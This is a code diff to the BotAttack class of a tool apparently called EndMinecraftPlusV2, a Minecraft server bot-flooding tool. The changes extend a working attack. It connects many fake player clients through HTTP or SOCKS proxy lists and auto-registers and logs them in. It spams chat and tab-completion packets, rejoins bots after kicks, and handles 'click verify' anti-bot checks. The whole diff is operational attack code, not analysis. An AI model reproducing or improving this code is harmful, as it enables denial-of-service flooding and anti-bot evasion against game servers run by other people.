@@ -63,8 +63,8 @@ public class BotAttack extends IAttack {
         this.modList = modList;
     }
 
-    public String getRandMessage() {
-        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6));
+    public String getRandMessage(String userName) {
+        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6).replace("$pwd",DataUtil.botRegPasswordsMap.get(userName)));
     }
 
     public void start() {
@@ -73,11 +73,16 @@ public class BotAttack extends IAttack {
                 for (Client c : clients) {
                     if (c.getSession().isConnected()) {
                         if (c.getSession().hasFlag("login")) {
-                            c.getSession().send(new ClientChatPacket(getRandMessage()));
+                            if (ConfigUtil.ChatSpam) {
+                                c.getSession().send(new ClientChatPacket(getRandMessage(clientName.get(c))));
+                            }
+
+                            OtherUtils.doSleep(ConfigUtil.ChatDelay);
                         } else if (c.getSession().hasFlag("join")) {
                             if (ConfigUtil.RegisterAndLogin) {
                                 for (String cmd:ConfigUtil.RegisterCommands) {
                                     c.getSession().send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
+                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                 }
                             }
 
@@ -115,11 +120,14 @@ public class BotAttack extends IAttack {
         if (this.attack_tab) {
             tabThread = new Thread(() -> {
                 while (true) {
+                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
+
                     for (Client c : clients) {
                         if (c.getSession().isConnected() && c.getSession().hasFlag("join")) {
                             MultiVersionPacket.sendTabPacket(c.getSession(), "/");
                         }
                     }
+
                     OtherUtils.doSleep(10);
                 }
             });
@@ -153,11 +161,23 @@ public class BotAttack extends IAttack {
         for (String p: ProxyUtil.proxies) {
             try {
                 String[] _p = p.split(":");
-                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+
+                Proxy.Type proxyType;
+                switch (ConfigUtil.ProxyType) {
+                    case 2:
+                        proxyType = Proxy.Type.SOCKS;
+                        break;
+                    case 1:
+                    default:
+                        proxyType = Proxy.Type.HTTP;
+                        break;
+                }
+
+                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                 String[] User = AttackManager.getRandomUser().split("@");
                 Client client = createClient(ip, port, User[0], proxy);
-                client.getSession().setReadTimeout(10 * 1000);
-                client.getSession().setWriteTimeout(10 * 1000);
+                client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectDelay));
+                client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectDelay));
                 clientName.put(client, User[0]);
                 clients.add(client);
 
@@ -208,32 +228,34 @@ public class BotAttack extends IAttack {
                     for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                         if (msg.contains(rejoinDetect)) {
                             for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
-                                createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
-                                rejoin++;
+                                Client rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
+                                rejoinClient.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
+                                rejoinClient.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
 
+                                rejoin++;
                                 LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
+                                clientName.put(rejoinClient, username);
+                                clients.add(rejoinClient);
+                                rejoinClient.getSession().connect(false);
 
                                 OtherUtils.doSleep(ConfigUtil.RejoinDelay);
 
-                                boolean canBreak = false;
-
-                                for (Client client:clientName.keySet()) {
-                                    if (clientName.get(client).contains(username)) {
-                                        canBreak = true;
-                                    }
-                                }
-
-                                if (canBreak) {
+                                if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
                                     break;
                                 }
                             }
                         }
                     }
+                } else if (ConfigUtil.ShowFails) {
+                    msg = e.getCause().getMessage();
+                    LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");
                 }
 
                 failed++;
                 alivePlayers.remove(username);
-                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
+
+                client.getSession().disconnect("");
+                clients.remove(client);
             }
         });
         return client;
@@ -294,10 +316,13 @@ public class BotAttack extends IAttack {
             MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
             MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
         } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
-            ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
-            MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
-            session.send(new ClientPlayerMovementPacket(true));
-            MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
+            try {
+                ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
+                MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
+                session.send(new ClientPlayerMovementPacket(true));
+                MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
+            } catch (Exception ignored) {}
+
         } else if (recvPacket instanceof ServerChatPacket) {
             ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;
             clickVerifiesHandle(chatPacket.getMessage(), session, username);
